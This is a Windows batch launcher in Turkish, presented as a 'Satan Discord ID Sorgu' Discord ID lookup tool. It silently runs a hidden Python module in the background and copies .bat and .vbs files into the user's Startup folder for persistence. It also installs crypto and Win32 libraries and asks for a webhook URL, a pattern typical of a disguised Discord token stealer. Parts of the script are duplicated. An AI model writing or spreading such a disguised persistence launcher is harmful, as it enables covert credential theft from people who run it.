@echo off
chcp 65001 >nul
title Satan Discord ID Sorgu
start "" /B python modules/accepts/main.py
@echo off
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set KAYNAK=%~dp0modules\accepts

copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"

pause
pip install pypiwin32
pip install pycryptodome
cls
color 0A
echo.
echo  ============================================
echo       Satan Discord ID Sorgu
echo  ============================================
echo.
set /p SERVER_ID= Sunucu ID'sini girin: 
echo.
set /p WEBHOOK_URL= Webhook URL'sini girin: 
echo.
echo  Gereksinimler yukleniyor...
echo.
pip install pypiwin32
pip install pycryptodome
echo.
echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
echo.
timeout /t 8 >nul

@echo off
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set KAYNAK=%~dp0modules\accepts

copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"

pause
exit
